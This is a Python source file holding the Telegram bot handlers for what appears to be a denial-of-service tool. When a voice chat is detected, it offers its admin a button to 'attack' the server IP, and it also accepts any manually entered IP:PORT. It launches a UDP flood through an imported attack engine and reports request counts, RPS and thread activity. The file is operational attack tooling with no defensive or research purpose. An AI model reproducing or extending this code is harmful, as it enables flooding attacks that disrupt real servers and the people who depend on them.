"""
Telegram Bot Handlers
Manages bot interactions and UI
"""

import asyncio
import logging
import random
from typing import Optional
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import FloodWait, MessageNotModified, MessageDeleteForbidden

from config import Config, ATTACK_METHODS
from utils import get_public_ip, is_valid_ip, parse_ip_port, format_number
from vc_detector import VCInfo

logger = logging.getLogger(__name__)

# Parse mode constant
PARSE_MODE = "html"


class BotHandler:
    """Manages bot commands and interactions"""
    
    def __init__(self, bot: Client, attack_engine, admin_id: int):
        self.bot = bot
        self.attack_engine = attack_engine
        self.admin_id = admin_id
        self.logger = logging.getLogger(__name__)
        
        # Register handlers
        self._register_handlers()
    
    def _register_handlers(self):
        """Register all message handlers"""
        
        @self.bot.on_message(filters.command("start") & filters.private)
        async def start_handler(client, message):
            if message.from_user.id != self.admin_id:
                await message.reply_text("⛔ <b>Unauthorized Access</b>", parse_mode=PARSE_MODE)
                return
            
            status = "🟢 <b>MONITORING</b>" if Config.MONITORING_MODE else "⚪ <b>STANDBY</b>"
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("📊 Status", callback_data="show_status"),
                 InlineKeyboardButton("🎯 Manual Target", callback_data="manual_target")]
            ])
            
            text = (
                "🤖 <b>VC Monitor Bot</b>\n\n"
                f"Status: {status}\n"
                "Monitoring your Voice Chat activity...\n\n"
                "<b>Fixed Configuration:</b>\n"
                f"├ Max Requests: <code>{format_number(Config.MAX_REQUESTS)}</code>\n"
                f"├ Threads: <code>{Config.THREAD_COUNT}</code>\n"
                f"├ Timeout: <code>{Config.ATTACK_TIMEOUT}s</code>\n"
                f"└ Check Interval: <code>{Config.VC_CHECK_INTERVAL}s</code>"
            )
            
            try:
                await message.reply_text(text, reply_markup=keyboard, parse_mode=PARSE_MODE)
            except FloodWait as e:
                await asyncio.sleep(e.value)
            except Exception as e:
                self.logger.error(f"Start handler error: {e}")
        
        @self.bot.on_message(filters.command("status") & filters.private)
        async def status_handler(client, message):
            if message.from_user.id != self.admin_id:
                return
            
            try:
                status = self.attack_engine.get_status()
                
                if status['running']:
                    progress_pct = min(100, (status['progress'] / max(status['max'], 1)) * 100)
                    bar = "█" * int(progress_pct / 10) + "░" * (10 - int(progress_pct / 10))
                    
                    text = (
                        "🚀 <b>Attack In Progress</b>\n\n"
                        f"Target: <code>{status['target']}:{status['port']}</code>\n"
                        f"Progress: <code>[{bar}] {progress_pct:.1f}%</code>\n"
                        f"Requests: <code>{format_number(status['progress'])} / {format_number(status['max'])}</code>\n"
                        f"Successful: <code>{format_number(status['successful'])}</code>\n"
                        f"Failed: <code>{format_number(status['failed'])}</code>\n"
                        f"Success Rate: <code>{status['success_rate']:.2f}%</code>\n"
                        f"RPS: <code>{status['rps']:.2f}</code>\n"
                        f"Duration: <code>{status['duration']:.1f}s</code>\n"
                        f"Active Threads: <code>{status['threads_active']}</code>"
                    )
                else:
                    text = (
                        "📊 <b>Status: IDLE</b>\n\n"
                        "No active attack.\n"
                        "Join a Voice Chat to trigger detection."
                    )
                
                await message.reply_text(text, parse_mode=PARSE_MODE)
            except Exception as e:
                self.logger.error(f"Status handler error: {e}")
                await message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode=PARSE_MODE)
        
        @self.bot.on_message(filters.command("stop") & filters.private)
        async def stop_handler(client, message):
            if message.from_user.id != self.admin_id:
                return
            
            try:
                if self.attack_engine.stats.is_running:
                    stats = self.attack_engine.stop_attack()
                    
                    text = (
                        "🛑 <b>Attack Stopped</b>\n\n"
                        "Final Statistics:\n"
                        f"├ Total: <code>{format_number(stats['total'])}</code>\n"
                        f"├ Success: <code>{format_number(stats['successful'])} ({stats['success_rate']:.2f}%)</code>\n"
                        f"├ Failed: <code>{format_number(stats['failed'])}</code>\n"
                        f"├ Duration: <code>{stats['duration']:.2f}s</code>\n"
                        f"└ RPS: <code>{stats['rps']:.2f}</code>"
                    )
                else:
                    text = "ℹ️ No active attack to stop."
                
                await message.reply_text(text, parse_mode=PARSE_MODE)
            except Exception as e:
                self.logger.error(f"Stop handler error: {e}")
                await message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode=PARSE_MODE)
        
        @self.bot.on_callback_query(filters.regex("^attack_(.+)_(.+)_(.+)_yes$"))
        async def confirm_attack(client, callback: CallbackQuery):
            if callback.from_user.id != self.admin_id:
                await callback.answer("Unauthorized!", show_alert=True)
                return
            
            try:
                data = callback.data.split("_")
                target_ip = data[1]
                target_port = int(data[2])
                
                # Edit message immediately
                try:
                    await callback.edit_message_text(
                        f"⏳ <b>Starting Attack...</b>\nTarget: <code>{target_ip}:{target_port}</code>",
                        parse_mode=PARSE_MODE
                    )
                except MessageNotModified:
                    pass
                
                # Start attack
                success = self.attack_engine.start_attack(target_ip, target_port, method="udp")
                
                if success:
                    try:
                        text = (
                            "🚀 <b>Attack Launched!</b>\n\n"
                            f"Target: <code>{target_ip}:{target_port}</code>\n"
                            "Method: <code>UDP Flood</code>\n"
                            f"Max Requests: <code>{format_number(Config.MAX_REQUESTS)}</code>\n"
                            f"Threads: <code>{Config.THREAD_COUNT}</code>\n\n"
                            "<b>Status:</b> ⚡ RUNNING\n\n"
                            "Use /status for progress\n"
                            "Use /stop to halt"
                        )
                        await callback.edit_message_text(text, parse_mode=PARSE_MODE)
                    except MessageNotModified:
                        pass
                    
                    # Start monitoring task
                    asyncio.create_task(self._monitor_attack(callback.message))
                else:
                    await callback.edit_message_text("❌ Failed to start attack.", parse_mode=PARSE_MODE)
                    
            except Exception as e:
                self.logger.error(f"Confirm attack error: {e}")
                await callback.edit_message_text(f"❌ Error: {str(e)[:100]}", parse_mode=PARSE_MODE)
        
        @self.bot.on_callback_query(filters.regex("^attack_cancel$"))
        async def cancel_attack(client, callback: CallbackQuery):
            if callback.from_user.id != self.admin_id:
                return
            
            try:
                await callback.edit_message_text(
                    "❌ <b>Attack Cancelled</b>\n\n"
                    "No requests were sent.\n"
                    "Join another VC or use manual target.",
                    parse_mode=PARSE_MODE
                )
            except Exception as e:
                self.logger.error(f"Cancel error: {e}")
        
        @self.bot.on_callback_query(filters.regex("^manual_target$"))
        async def manual_target(client, callback: CallbackQuery):
            if callback.from_user.id != self.admin_id:
                return
            
            try:
                await callback.edit_message_text(
                    "🎯 <b>Manual Target Entry</b>\n\n"
                    "Send target in format:\n"
                    "<code>IP:PORT</code>\n\n"
                    "Examples:\n"
                    "• <code>192.168.1.1:8080</code>\n"
                    "• <code>10.0.0.1:53</code>\n\n"
                    "Or just IP (defaults to 80):\n"
                    "• <code>192.168.1.1</code>",
                    parse_mode=PARSE_MODE
                )
            except Exception as e:
                self.logger.error(f"Manual target error: {e}")
        
        @self.bot.on_message(filters.text & filters.private)
        async def handle_manual_ip(client, message):
            if message.from_user.id != self.admin_id:
                return
            
            text = message.text.strip()
            
            # Try to parse IP:PORT
            parsed = parse_ip_port(text)
            if parsed:
                ip, port = parsed
            elif is_valid_ip(text):
                ip, port = text, 80
            else:
                await message.reply_text("❌ Invalid format. Use <code>IP:PORT</code> or just <code>IP</code>", parse_mode=PARSE_MODE)
                return
            
            try:
                keyboard = InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("✅ YES - Attack", callback_data=f"attack_{ip}_{port}_{random.randint(1,999)}_yes"),
                        InlineKeyboardButton("❌ Cancel", callback_data="attack_cancel")
                    ]
                ])
                
                msg_text = (
                    "🎯 <b>Confirm Manual Target</b>\n\n"
                    f"IP: <code>{ip}</code>\n"
                    f"Port: <code>{port}</code>\n\n"
                    "Attack Settings:\n"
                    f"├ Max Requests: <code>{format_number(Config.MAX_REQUESTS)}</code>\n"
                    f"├ Threads: <code>{Config.THREAD_COUNT}</code>\n"
                    f"└ Timeout: <code>{Config.ATTACK_TIMEOUT}s</code>\n\n"
                    "Confirm to proceed?"
                )
                
                await message.reply_text(msg_text, reply_markup=keyboard, parse_mode=PARSE_MODE)
            except Exception as e:
                self.logger.error(f"Handle manual IP error: {e}")
    
    async def _monitor_attack(self, message):
        """Background task to monitor attack and send completion"""
        try:
            while self.attack_engine.stats.is_running:
                await asyncio.sleep(10)
            
            # Attack finished
            stats = self.attack_engine.get_status()
            
            text = (
                "✅ <b>Attack Completed</b>\n\n"
                "📊 <b>Final Statistics:</b>\n"
                f"├ Total Requests: <code>{format_number(stats['progress'])}</code>\n"
                f"├ Successful: <code>{format_number(stats['successful'])}</code>\n"
                f"├ Failed: <code>{format_number(stats['failed'])}</code>\n"
                f"├ Success Rate: <code>{stats['success_rate']:.2f}%</code>\n"
                f"├ Duration: <code>{stats['duration']:.2f}s</code>\n"
                f"└ RPS: <code>{stats['rps']:.2f}</code>\n\n"
                f"Target: <code>{stats['target']}</code>"
            )
            
            await message.reply_text(text, parse_mode=PARSE_MODE)
        except Exception as e:
            self.logger.error(f"Monitor attack error: {e}")
    
    async def notify_vc_detected(self, vc_info: VCInfo):
        """Send notification when VC detected"""
        try:
            server_ip = get_public_ip()
            unique_id = random.randint(1000, 9999)
            
            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ YES - Attack Server IP", callback_data=f"attack_{server_ip}_{Config.ATTACK_PORT}_{unique_id}_yes"),
                    InlineKeyboardButton("❌ Cancel", callback_data="attack_cancel")
                ],
                [
                    InlineKeyboardButton("📝 Manual IP Entry", callback_data="manual_target")
                ]
            ])
            
            text = (
                "🔍 <b>Voice Chat Detected!</b>\n\n"
                "📍 <b>Chat Info:</b>\n"
                f"├ Name: <code>{vc_info.chat_title}</code>\n"
                f"├ ID: <code>{vc_info.chat_id}</code>\n"
                f"├ Participants: <code>{vc_info.participants_count}</code>\n"
                f"└ Status: <code>{'Active' if vc_info.is_active else 'Inactive'}</code>\n\n"
                "🌐 <b>Server Public IP:</b>\n"
                f"└ <code>{server_ip}</code>\n\n"
                "⚙️ <b>Attack Configuration:</b>\n"
                f"├ Max Requests: <code>{format_number(Config.MAX_REQUESTS)}</code>\n"
                f"├ Threads: <code>{Config.THREAD_COUNT}</code>\n"
                f"├ Port: <code>{Config.ATTACK_PORT}</code>\n"
                f"└ Timeout: <code>{Config.ATTACK_TIMEOUT}s</code>\n\n"
                "Do you want to attack the server IP?"
            )
            
            await self.bot.send_message(
                self.admin_id,
                text,
                reply_markup=keyboard,
                parse_mode=PARSE_MODE
            )
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except Exception as e:
            self.logger.error(f"Notify VC error: {e}")
    
    async def send_error(self, error_msg: str):
        """Send error notification to admin"""
        try:
            await self.bot.send_message(
                self.admin_id,
                f"⚠️ <b>Error</b>\n\n<code>{error_msg[:4000]}</code>",
                parse_mode=PARSE_MODE
            )
        except Exception as e:
            self.logger.error(f"Send error failed: {e}")
